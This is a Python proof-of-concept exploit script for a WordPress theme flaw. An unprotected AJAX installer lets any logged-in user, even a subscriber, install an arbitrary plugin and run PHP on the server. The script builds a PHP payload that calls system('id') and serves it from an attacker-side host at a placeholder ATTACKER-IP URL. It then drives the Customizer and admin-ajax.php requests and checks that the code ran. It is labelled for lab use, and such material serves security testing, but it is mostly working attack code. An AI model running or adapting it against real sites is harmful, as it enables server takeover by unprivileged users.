#!/usr/bin/env python3
"""
Click2Shell primitive #2 — Theme AJAX installer abuse (lab use only)
====================================================================
The theme-side bug by itself (no Core selector injection needed): Mobile
Repair Zone 2.5.4 (and 40+ other catalog themes per the disclosure) loaded
its functions.php during a Customizer preview of the *inactive* theme and
registered an AJAX action with NO nonce and NO capability check.

The callback takes an attacker-chosen plugin package URL, downloads it into
wp-content/plugins/, unpacks it and loads its PHP entry point.

Impact alone: ANY authenticated user (even a low-privilege Subscriber) can
install an arbitrary plugin package -> PHP execution as the WP server
account. Privilege escalation to full site/server takeover.

Prerequisites in the lab:
  * WordPress < 7.1.1 (theme bug is in the theme, but keep the lab consistent)
  * the vulnerable theme installed (e.g. via the forced-install PoC, or
    uploaded manually) — it does NOT need to be active
  * a logged-in session cookie for ANY user (subscriber is enough)

ONLY test against an isolated WordPress installation you own / are
explicitly authorized to test.

NOTE: exact AJAX action name + parameter names are templates — copy the
verbatim strings from the pwn.ai article (pwn.ai/blog/click2shell).

Usage:
    python3 click2shell_ajax_installer_poc.py --target http://wp-lab.local \
        --theme mobile-repair-zone \
        --cookie "wordpress_logged_in_xxx=..." \
        --package http://ATTACKER-IP:8000/c2s-proof.zip
"""
import argparse
import io
import zipfile

import requests

AJAX_ACTION = "REPLACE_WITH_ACTION_NAME"
AJAX_PARAM_PACKAGE = "REPLACE_WITH_PARAM"

PLUGIN_PHP = """<?php
/*
Plugin Name: Click2Shell Proof
Description: Harmless lab proof - executes `id` once when loaded.
*/
echo "<pre>Click2Shell proof plugin loaded.\\n";
system("id 2>&1");
echo "</pre>";
"""


def build_plugin_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("c2s-proof/c2s-proof.php", PLUGIN_PHP)
    return buf.getvalue()


def session_from_cookie(cookie: str) -> requests.Session:
    s = requests.Session()
    for pair in cookie.split(";"):
        if "=" in pair:
            k, v = pair.strip().split("=", 1)
            s.cookies.set(k.strip(), v.strip())
    return s


def main():
    ap = argparse.ArgumentParser(description="Click2Shell AJAX-installer lab PoC")
    ap.add_argument("--target", required=True, help="Lab WP base URL")
    ap.add_argument("--theme", default="mobile-repair-zone", help="Vulnerable theme slug (installed, inactive ok)")
    ap.add_argument("--cookie", required=True, help="Any logged-in user's Cookie header value")
    ap.add_argument("--package", required=True, help="URL of the plugin ZIP the theme should fetch")
    ap.add_argument("--serve-zip", action="store_true",
                    help="Serve the built-in proof ZIP on :8002/c2s-proof.zip instead of --package")
    args = ap.parse_args()

    if "REPLACE" in AJAX_ACTION or "REPLACE" in AJAX_PARAM_PACKAGE:
        print("[!] Fill AJAX_ACTION / AJAX_PARAM_PACKAGE from the pwn.ai article first.")
        return

    package_url = args.package
    if args.serve_zip:
        import http.server, socketserver, threading
        zip_bytes = build_plugin_zip()

        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def do_GET(self):
                if self.path == "/c2s-proof.zip":
                    self.send_response(200)
                    self.send_header("Content-Type", "application/zip")
                    self.send_header("Content-Length", str(len(zip_bytes)))
                    self.end_headers()
                    self.wfile.write(zip_bytes)
                else:
                    self.send_error(404)

        srv = socketserver.TCPServer(("0.0.0.0", 8002), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        package_url = "http://ATTACKER-IP:8002/c2s-proof.zip".replace("ATTACKER-IP", "<your-ip>")
        print(f"[!] Serving proof ZIP on :8002 — pass the real reachable URL via --package,")
        print(f"    e.g. --package http://<your-ip>:8002/c2s-proof.zip (not the placeholder above)")

    s = session_from_cookie(args.cookie)
    base = args.target.rstrip("/")

    # Step 1: Customizer preview loads the INACTIVE theme's functions.php,
    # registering the vulnerable AJAX handler server-side.
    r1 = s.get(f"{base}/wp-admin/customize.php", params={"theme": args.theme}, timeout=20)
    print(f"[+] customize.php?theme={args.theme} -> HTTP {r1.status_code}")

    # Step 2: unprotected AJAX installer fetches + unpacks + loads our plugin.
    r2 = s.post(f"{base}/wp-admin/admin-ajax.php",
                data={"action": AJAX_ACTION, AJAX_PARAM_PACKAGE: package_url},
                timeout=60)
    print(f"[+] admin-ajax.php action={AJAX_ACTION} -> HTTP {r2.status_code}")
    print(f"    response (truncated): {r2.text[:300]!r}")

    # Step 3: verify — the plugin file now exists and executes.
    r3 = s.get(f"{base}/wp-content/plugins/c2s-proof/c2s-proof.php", timeout=20)
    print(f"[+] plugin URL -> HTTP {r3.status_code}")
    if r3.status_code == 200:
        print("    plugin output (truncated):")
        print("    " + r3.text[:400].replace("\n", "\n    "))
    else:
        print("[-] plugin not reachable — check action/param names and server logs.")


if __name__ == "__main__":
    main()
